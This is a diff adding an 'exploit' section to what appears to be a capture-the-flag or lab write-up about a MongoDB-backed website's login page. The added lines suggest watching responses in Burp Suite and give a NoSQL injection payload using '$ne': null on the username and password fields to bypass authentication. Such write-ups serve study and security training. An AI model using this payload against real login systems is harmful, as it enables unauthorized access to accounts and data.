@@ -15,4 +15,9 @@ we can see is login page
 and when we download source code for the website 
 as we see is mongodb database , is save data as json file
 <img width="1599" height="860" alt="2" src="https://github.com/user-attachments/assets/934c5170-5656-4179-9b4b-7370ada1aef0" />
+# exploit:
+open burp suite to look at everything the server is sending back
+and we need to get payload JSON data to exploit 
+
+    {"username": {"$ne": null}, "password": {"$ne": null}}
 
